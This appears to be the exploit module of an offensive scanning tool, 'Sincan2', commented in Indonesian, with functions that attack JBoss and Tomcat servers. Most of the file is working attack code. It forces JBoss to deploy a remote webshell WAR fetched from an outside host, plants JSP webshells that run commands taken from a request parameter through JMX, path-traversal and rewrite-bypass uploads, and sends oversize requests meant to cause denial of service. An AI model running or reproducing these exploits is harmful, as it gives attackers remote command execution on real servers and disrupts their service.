# File: _exploits.py
# -*- coding: utf-8 -*-
"""
Kumpulan modul eksploitasi untuk Sincan2.
Menggabungkan logika dari berbagai versi Sincan2 ke dalam satu file modular.
"""

import sincan2
from time import sleep
from random import randint
import urllib
import base64, gzip, zlib
from sys import version_info, exit
from io import BytesIO

if version_info[0] >= 3:
    from urllib.parse import quote, urlparse
import socket

# Dependensi baru untuk modul modern
try:
    from urllib3.exceptions import TimeoutError, NewConnectionError, MaxRetryError
except ImportError:
    print("Urllib3 tidak ditemukan. Silakan install: pip install urllib3")
    exit(1)
    
import json

# Definisi warna
RED = '\x1b[91m'
GREEN = '\033[32m'
BLUE = '\033[94m'
BOLD = '\033[1m'
ENDC = '\033[0m'

global gl_http_pool

def set_http_pool(pool):
    """Mengonfigurasi http pool."""
    global gl_http_pool
    gl_http_pool = pool

def get_successfully(url, path):
    """Menguji apakah request GET ke URL berhasil setelah penundaan."""
    sleep(5)
    headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
               "Connection": "keep-alive",
               "User-Agent": sincan2.get_random_user_agent()}
    try:
        r = gl_http_pool.request('GET', url + path, redirect=False, headers=headers)
        result = r.status
        if result == 404:
            sleep(7)
            r = gl_http_pool.request('GET', url + path, redirect=False, headers=headers)
            result = r.status
        return result
    except Exception:
        return 404

def exploit_jmx_console_main_deploy(url):
    """Mengeksploitasi MainDeployer untuk men-deploy shell JSP."""
    if not url.startswith('http'):
        url = "http://"+url
    jsp_url = "http://www.joaomatosf.com/rnp/jexws4.war"
    payload_path = ("/jmx-console/HtmlAdaptor?action=invokeOp&name=jboss.system:service="
                    "MainDeployer&methodIndex=19&arg0=" + jsp_url)
    sincan2.print_and_flush(GREEN + f"\n * Info: Memaksa server untuk deploy webshell dari: {jsp_url}" + ENDC)
    headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
               "User-Agent": sincan2.get_random_user_agent()}
    try:
        gl_http_pool.request('GET', url + payload_path, redirect=False, headers=headers)
        if get_successfully(url, "/jexws4/jexws4.jsp") == 200:
            return True
        return False
    except Exception:
        return False

def exploit_jmx_console_file_repository(url):
    """Mengeksploitasi DeploymentFileRepository untuk men-deploy shell JSP."""
    jsp_payload = ("%3C%25%40%20%70%61%67%65%20%69%6D%70%6F%72%74%3D%22%6A%61%76%61%2E%6C%61%6E%67%2E%2A%2C%6A%61"
                   "%76%61%2E%75%74%69%6C%2E%2A%2C%6A%61%76%61%2E%69%6F%2E%2A%2C%6A%61%76%61%2E%6E%65%74%2E%2A%22%20"
                   "%70%61%67%65%45%6E%63%6F%64%69%6E%67%3D%22%55%54%46%2D%38%22%25%3E%20%3C%70%72%65%3E%20%3C%25%20"
                   "if(request.getParameter(\"ppp\")!=null){java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(\"ppp\")).getInputStream();int a = -1;byte[] b = new byte[2048];while((a=in.read(b))!=-1){out.println(new String(b));}}%25%3E")

    payload_path = ("/jmx-console/HtmlAdaptor?action=invokeOpByName&name=jboss.admin:service="
                    "DeploymentFileRepository&methodName=store&argType=java.lang.String&arg0="
                    "jexws4.war&argType=java.lang.String&arg1=jexws4&argType=java.lang.St"
                    "ring&arg2=.jsp&argType=java.lang.String&arg3=" + jsp_payload + "&argType=boolean&arg4=True")
    headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
               "User-Agent": sincan2.get_random_user_agent()}
    try:
        gl_http_pool.request('GET', url + payload_path, redirect=False, headers=headers)
        if get_successfully(url, "/jexws4/jexws4.jsp") == 200:
            return True
        return False
    except Exception:
        return False

def exploit_web_console_invoker(url):
    """Mengeksploitasi web console invoker (/web-console/Invoker) di JBoss 4."""
    # Placeholder for binary payload
    payload = b"..." 
    headers = { "Content-Type" : "application/x-java-serialized-object; class=org.jboss.console.remote.RemoteMBeanInvocation",
                "Accept"       : "text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2"}
    try:
        r = gl_http_pool.request("POST", url + "/web-console/Invoker", body=payload, headers=headers, redirect=False)
        if r.status == 401:
            sincan2.print_and_flush("    Retrying...", same_line=True)
            gl_http_pool.request("HEAD", url + "/web-console/Invoker", body=payload, headers=headers, redirect=False)
        if get_successfully(url, "/jexws4/jexws4.jsp") == 200:
            return True
        return False
    except Exception:
        return False

def exploit_jmx_invoker_file_repository(url, version=0):
    """Mengeksploitasi JMX invoker (/invoker/JMXInvokerServlet) di JBoss 4, 5."""
    # Placeholder for binary payload
    payload = b"..." 
    headers = {"Content-Type": "application/x-java-serialized-object; class=org.jboss.invocation.MarshalledValue",
               "User-Agent": sincan2.get_random_user_agent()}
    try:
        r = gl_http_pool.request('POST', url + "/invoker/JMXInvokerServlet", body=payload, headers=headers, redirect=False)
        if r.status == 401:
            sincan2.print_and_flush("    Retrying...", same_line=True)
            gl_http_pool.request('HEAD', url + "/invoker/JMXInvokerServlet", body=payload, headers=headers, redirect=False)
        if hasattr(r, 'data') and "Failed" in str(r.data):
             return False
        if get_successfully(url, "/jexinv4/jexinv4.jsp") == 200:
            return True
        return False
    except Exception:
        return False

# --- MODUL EKSPLOIT BARU (CVE 2022-2025) ---

def test_jta_loop(url, headers):
    """CVE-2022-0853: Simulasi memory leak via JTA UserTransaction."""
    sincan2.print_and_flush(" (Loop 15x)", same_line=True)
    try:
        target_endpoint = url + "/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:service=JNDIView"
        for _ in range(15):
            gl_http_pool.request('GET', target_endpoint, headers=headers, timeout=2.0)
        return {"status": "ok", "details": "Loop berhasil diselesaikan."}
    except (TimeoutError, MaxRetryError):
        return {"status": "vulnerable", "details": "Potensi DoS akibat kehabisan resource (timeout)."}
    except NewConnectionError:
        return {"status": "vulnerable", "details": "Koneksi ditolak, mungkin akibat crash."}
    except Exception as e:
        return {"status": "error", "details": str(e)}

def send_ajp_oversize_header(url, headers):
    """CVE-2023-5379: Simulasi overflow header di AJP via HTTP."""
    sincan2.print_and_flush(" (Header 80KB)", same_line=True)
    try:
        large_header = headers.copy()
        large_header['X-Overflow-Test-Header'] = 'A' * 80000
        gl_http_pool.request('GET', url, headers=large_header, timeout=5.0)
        return {"status": "ok", "details": "Server merespons dengan header besar."}
    except (TimeoutError, MaxRetryError):
        return {"status": "vulnerable", "details": "Server tidak merespons, indikasi kuat potensi DoS."}
    except NewConnectionError:
        return {"status": "vulnerable", "details": "Koneksi langsung ditutup, indikasi kuat."}
    except Exception as e:
        return {"status": "error", "details": str(e)}

def post_large_form(url, headers):
    """CVE-2023-1973: DoS via form authentication dengan payload besar."""
    payload = "large_input=" + "A" * 8_000_000
    form_headers = headers.copy()
    form_headers['Content-Type'] = 'application/x-www-form-urlencoded'
    sincan2.print_and_flush(" (Form 8MB)", same_line=True)
    try:
        r = gl_http_pool.request('POST', url, body=payload.encode('utf-8'), headers=form_headers, timeout=8.0)
        if r.status == 500:
            return {"status": "vulnerable", "details": "Server mengembalikan HTTP 500."}
        return {"status": "ok", "details": f"Server merespons dengan status {r.status}."}
    except (TimeoutError, MaxRetryError):
        return {"status": "vulnerable", "details": "Request timeout, potensi DoS karena kehabisan memori."}
    except NewConnectionError:
        return {"status": "vulnerable", "details": "Koneksi ditutup, potensi crash."}
    except Exception as e:
        return {"status": "error", "details": str(e)}

def send_spoofed_data(url, headers):
    """CVE-2023-6236: Simulasi bypass autentikasi data di EAP 8."""
    payload = {"user": "admin", "timestamp": "2020-01-01T00:00:00Z", "signature": "1234567890abcdef1234567890abcdef", "data": "some_critical_data"}
    json_headers = headers.copy()
    json_headers['Content-Type'] = 'application/json'
    sincan2.print_and_flush(" (Spoofed JSON)", same_line=True)
    try:
        r = gl_http_pool.request('POST', url, body=json.dumps(payload).encode('utf-8'), headers=json_headers, timeout=5.0)
        return {"status": "inconclusive", "details": f"Server merespons dengan status {r.status}."}
    except (TimeoutError, MaxRetryError, NewConnectionError):
        return {"status": "inconclusive", "details": "Server tidak merespons payload yang di-spoof."}
    except Exception as e:
        return {"status": "error", "details": str(e)}

def exploit_tomcat_cve_2025_24813(url, headers):
    """Mengeksploitasi Path Traversal di Tomcat untuk mengunggah webshell."""
    sincan2.print_and_flush(" (PUT /mhl.jsp)", same_line=True)
    jsp_shell = ('<%@ page import="java.io.*" %>\n' '<html><body>\n' '<form method="GET"><input type="text" name="ppp"><input type="submit" value="Run"></form>\n' '<pre>\n' '<% if(request.getParameter("ppp") != null) {\n' '    Process p = Runtime.getRuntime().exec(request.getParameter("ppp"));\n' '    BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));\n' '    String l; while((l=r.readLine())!=null){ out.println(l); }\n' '} %>\n' '</pre>\n' '</body></html>')
    exploit_path = "/uploads/../webapps/ROOT/mhl.jsp"
    target_url = url.rstrip('/') + exploit_path
    exploit_headers = {"Content-Type": "application/x-jsp", "User-Agent": sincan2.get_random_user_agent()}
    try:
        put_req = gl_http_pool.request('PUT', target_url, body=jsp_shell.encode('utf-8'), headers=exploit_headers)
        if put_req.status not in [200, 201, 204]:
            return {"status": "failed_put", "details": f"Gagal mengunggah shell, server merespons dengan status {put_req.status}."}
        sleep(2) 
        verify_url = url.rstrip('/') + "/mhl.jsp"
        verify_req = gl_http_pool.request('GET', verify_url, headers=headers)
        if verify_req.status == 200:
            return {"status": "vulnerable", "details": "Webshell berhasil diunggah ke /mhl.jsp."}
        else:
            return {"status": "failed_get", "details": f"Unggahan mungkin berhasil tetapi verifikasi gagal dengan status {verify_req.status}."}
    except Exception as e:
        return {"status": "error", "details": str(e)}

def exploit_tomcat_rewrite_bypass_cve_2025_31651(url, headers):
    """
    Mencoba bypass aturan rewrite Tomcat dan mengunggah shell 'mhl.jsp'.
    """
    sincan2.print_and_flush(" (Upload via %3f)", same_line=True)
    
    # Payload shell yang akan diunggah
    jsp_shell = ('<%@ page import="java.io.*" %>\n' '<html><body>\n' '<form method="GET"><input type="text" name="ppp"><input type="submit" value="Run"></form>\n' '<pre>\n' '<% if(request.getParameter("ppp") != null) {\n' '    Process p = Runtime.getRuntime().exec(request.getParameter("ppp"));\n' '    BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));\n' '    String l; while((l=r.readLine())!=null){ out.println(l); }\n' '} %>\n' '</pre>\n' '</body></html>')
    
    # Path target untuk mengunggah shell
    upload_path = "/sec/orders/mhl.jsp%3f"
    upload_url = url.rstrip('/') + upload_path
    
    exploit_headers = {"Content-Type": "application/x-jsp", "User-Agent": sincan2.get_random_user_agent()}

    try:
        # Coba unggah shell menggunakan metode PUT
        put_req = gl_http_pool.request('PUT', upload_url, body=jsp_shell.encode('utf-8'), headers=exploit_headers)

        if put_req.status not in [200, 201, 204]:
            # Jika PUT gagal, kemungkinan tidak rentan untuk penulisan file
            return {"status": "ok", "details": f"PUT request gagal dengan status {put_req.status}."}

        # Jika PUT berhasil, verifikasi apakah shell bisa diakses
        sleep(2)
        verify_url = url.rstrip('/') + "/sec/orders/mhl.jsp"
        verify_req = gl_http_pool.request('GET', verify_url, headers=headers)
        
        if verify_req.status == 200:
            # Sukses! Shell berhasil diunggah dan bisa diakses.
            return {"status": "vulnerable", "details": "Shell berhasil diunggah ke /sec/orders/mhl.jsp."}
        else:
            return {"status": "failed_get", "details": f"Unggahan mungkin berhasil, tapi verifikasi gagal dengan status {verify_req.status}."}

    except Exception as e:
        return {"status": "error", "details": str(e)}

